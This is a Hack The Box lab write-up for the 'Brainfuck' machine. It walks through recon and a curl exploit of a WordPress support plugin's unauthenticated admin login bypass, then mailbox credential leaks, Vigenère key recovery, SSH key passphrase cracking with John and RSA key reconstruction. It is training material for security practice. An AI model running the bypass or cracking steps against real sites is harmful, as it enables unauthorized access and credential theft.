# HTB: Brainfuck

**Target:** 10.129.48.193
**Attacker:** 10.10.15.146

---

## Enumeration

### Port scan (RustScan)

```
Open 10.129.48.193:22
Open 10.129.48.193:25
Open 10.129.48.193:110
Open 10.129.48.193:143
Open 10.129.48.193:443
```

### Service/version scan (Nmap)

```
nmap -sCV -T4 10.129.48.193 -p22,25,110,143,443 -oA nmap/nmap
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
25/tcp  open  smtp     Postfix smtpd
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-title: Brainfuck Ltd. – Just another WordPress site
|_http-generator: WordPress 4.7.3
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
```

The SSL certificate's SAN field leaks a hidden vhost: `sup3rs3cr3t.brainfuck.htb`. Both hostnames were added to `/etc/hosts`:

```
10.129.48.193 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

### Web fingerprinting

```
whatweb https://brainfuck.htb
```

```
Bootstrap[4.7.3], MetaGenerator[WordPress 4.7.3], PoweredBy[WordPress],
WordPress[4.7.3], Email[orestis@brainfuck.htb], nginx[1.10.0]
```

Confirms WordPress 4.7.3 and leaks a valid email address (`orestis@brainfuck.htb`).

### WPScan

```
wpscan --url https://brainfuck.htb --disable-tls-checks --no-update
```

Key findings:

```
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06)
[+] WordPress theme in use: proficient

[+] wp-support-plus-responsive-ticket-system
 | Version: 7.1.3 (80% confidence)
```

The `wp-support-plus-responsive-ticket-system` plugin v7.1.3 is vulnerable to an **unauthenticated privilege escalation / admin login bypass** — [exploit-db 41006](https://www.exploit-db.com/exploits/41006).

---

## Exploitation

### WordPress admin takeover

The plugin exposes an `admin-ajax.php` action (`loginGuestFacebook`) that allows logging in as any existing user by supplying just a username and arbitrary email — no password required.

```bash
curl -k -X POST https://brainfuck.htb/wp-admin/admin-ajax.php \
  -d "username=admin" \
  -d "email=anything@example.com" \
  -d "action=loginGuestFacebook" \
  -i
```

Response returns valid authenticated cookies:

```
Set-Cookie: wordpress_logged_in_...=admin%7C...; path=/; secure; HttpOnly
```

Using these cookies to browse the dashboard confirms admin access. A "Dev Update" post references SMTP integration for `orestis@brainfuck.htb`.

### Leaking SMTP credentials

Under **Settings → Easy WP SMTP**, the password field is masked. Changing the input type from `password` to `text` in browser dev tools reveals it:

```html
<input type="password" name="swpsmtp_smtp_password" value="kHGuERB29DNiNE">
```

### Mail enumeration (POP3)

```
telnet brainfuck.htb 110
```

```
USER orestis
PASS kHGuERB29DNiNE
+OK Logged in.
LIST
+OK 2 messages:
1 977
2 514
RETR 2
```

Message 2 (`root@brainfuck.htb` → `orestis@brainfuck.htb`, subject "Forum Access Details"):

```
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO
```

### Hidden forum (sup3rs3cr3t.brainfuck.htb)

Logging in with the leaked credentials on the hidden vhost reveals a forum. A post titled *"Orestis - Hacking for fun and profit"* in the general thread gives a known plaintext/ciphertext pair used to recover the Vigenère key protecting a second, encrypted post. Comparing the two yields the passphrase:

```
fuckmybrain
```

Decrypting the secret post (via [rumkin.com/tools/cipher/vigenere](https://rumkin.com/tools/cipher/vigenere/#)) reveals a link to an SSH private key:

```
https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

### Cracking the SSH key passphrase

The downloaded key is passphrase-protected:

```
ssh -i id_rsa orestis@brainfuck.htb
Enter passphrase for key 'id_rsa':
```

Cracked offline with John:

```
ssh2john id_rsa > id_john
john --wordlist=/usr/share/wordlists/rockyou.txt id_john
```

```
3poulakia!       (id_rsa)
1g 0:00:00:17 DONE
```

### Shell access

```
ssh -i id_rsa orestis@brainfuck.htb
```

```
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
orestis@brainfuck:~$
```

user.txt obtained from `/home/orestis/user.txt`.

---

## Privilege Escalation — RSA Decryption

Three files present in `/home/orestis`:

- **`encrypt.sage`** — a Sage script that reads `/root/root.txt`, RSA-encrypts it with a freshly generated 1024-bit `p`, `q`, and random `e`, and writes the ciphertext to `output.txt` and the key parameters (`p`, `q`, `e`) to `debug.txt`.
- **`debug.txt`** — leaks the actual `p`, `q`, and `e` used.
- **`output.txt`** — the encrypted root flag (ciphertext).

Since `p`, `q`, and `e` are all known, `d` (the private exponent) can be derived directly via the extended Euclidean algorithm — no factoring attack needed.

### Decryption script

Adapted from [crypto.stackexchange.com/a/19530](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e):

```python
def egcd(a, b):
    x, y, u, v = 0, 1, 1, 0
    while a != 0:
        q, r = b // a, b % a
        m, n = x - u * q, y - v * q
        b, a, x, y, u, v = a, r, u, v, m, n
        gcd = b
    return gcd, x, y

def main():
    p = <value from debug.txt>
    q = <value from debug.txt>
    e = <value from debug.txt>
    ct = <value from output.txt>

    n = p * q
    phi = (p - 1) * (q - 1)

    gcd, a, b = egcd(e, phi)
    d = a

    pt = pow(ct, d, n)
    print("pt:", pt)

if __name__ == "__main__":
    main()
```

### Running it

```
orestis@brainfuck:~$ python decrypt.py
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
```

### Converting decimal → hex → ASCII

```bash
python -c "print format(24604052029401386049980296953784287079059245867880966944246662849341507003750, 'x').decode('hex')"
```

```
6efc1a5dbb8904751ce6566a305bb8ef
```

This is the value contained in `root.txt` (flag omitted here).

---

## Summary

| Stage | Technique |
|---|---|
| Recon | SSL SAN enumeration to find hidden vhost |
| Foothold path | Unauthenticated WordPress admin bypass via vulnerable plugin (`loginGuestFacebook`) |
| Credential leak | SMTP password exposed via dev-tools input type change |
| Lateral info | POP3 mailbox reveals forum credentials |
| Hidden content | Vigenère cipher (known-plaintext key recovery) decrypts forum post → SSH key |
| Access | SSH key passphrase cracked with John + rockyou |
| Privesc | RSA private key reconstruction from leaked `p`, `q`, `e` to decrypt root flag |
